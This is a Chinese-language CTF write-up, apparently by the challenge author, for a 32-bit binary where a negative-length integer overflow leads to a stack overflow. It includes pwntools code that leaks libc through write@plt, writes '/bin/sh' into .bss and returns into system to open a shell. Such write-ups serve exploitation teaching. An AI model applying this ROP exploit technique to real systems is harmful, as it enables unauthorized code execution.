## Preface

(╯‵□′)╯︵┻━┻。为什么会这样呢，明明是我先出的题，都没有人做。


## checksec

检查发现是32bit程序，有NX，没有canary

## Vuln

1. 仔细分析程序，可以发现有整数溢出
2. 整数溢出之后可以构成栈溢出


## Leak
在输入负数之后，我们可以输入很打的字符串，从而造成栈溢出
### rop

再构成溢出之后采用rop的方式泄露栈地址<br>
可以找libc_csu_init等rop(用ropper找很方便)


```Python
def ro_gadget(func, arg1, arg2, arg3, ret_addr):
    payload = p32(func)
    payload += p32(pops_addr)
    payload += p32(arg1)
    payload += p32(arg2)
    payload += p32(arg3)
    payload += p32(ret_addr)*4
    payload += p32(pops_addr)
    payload += p32(ret_addr)*7
    payload += p32(ret_addr)
    return payload
```

写了一个方便leak的函数<br>
```Python

def leak(address):
    io.recvuntil("bytes you need")
    io.sendline(str(-1))
    io.recvuntil("Leave your code for the first time :)")
    payload = padding
    payload += ro_gadget(elf.plt['write'], 1, address, 40, vuln_addr)
    io.sendline(payload)
    io.recvuntil("the TE!\n")
    data = io.recv(4)
    return data
```
改函数最后返回到main函数，方便之后可以再利用一次

## exp
写exp有很多方法，如virtualprotect或者mmap来过NX，或者直接rop system执行shell<br>
这里只用的rop system

### calculate system

计算很简单，libc给了(如果没有给libc，可以利用pwntools的dynelf或者字节写leak来泄露需要的函数地址)<br>
```Python
read_addr = u32(leak(elf.got['read']))
print 'read address:', hex(read_addr)
libc_addr = read_addr - 0xD5980
print 'libc address:', hex(libc_addr)
system_addr = libc_addr + 0x3ADA0
print 'system address:', hex(system_addr)
```

### write "/bin/sh"
想要调用类似system("/bin/sh")这样的rop，还需要找一个地址有"/bin/sh"这样的字符串，当然直接再libc找是可以的。<br>
这里采用调用read函数把字符串写入bss段，然后直接指定写进的地址即可。<br>

```Python
io.sendline(str(-1))
io.recvuntil("Leave your code for the first time :)")
payload = padding
payload += ro_gadget(elf.plt['read'], 0, bss_w_addr, 8, vuln_addr)
raw_input("got?")
io.sendline(payload)
io.recvuntil("the TE!\n")
io.send('/bin/sh\x00')
```
至此即可写入了 "/bin/sh"

### system
system的地址之前已经计算了，而且这个时候binsh也写如了bss段，直接一个rop即可

```Python
payload = padding
payload += p32(system_addr)
payload += p32(vuln_addr)
payload += p32(bss_w_addr)
io.recvuntil("bytes you need")
io.sendline(str(-1))
io.recvuntil("Leave your code for the first time :)")
io.sendline(payload)
io.interactive()
```

## Summary

主要考察一个整数溢出漏洞<br>
其次是基础的rop的编写(32bit，64bit的类似)<br>

本来预计这个题有人做出来的，，/(ㄒoㄒ)/~~，没想到没一个人做。。顺便吐槽一下，为啥我出的题都没有人做出来，(╯‵□′)╯︵┻━┻。
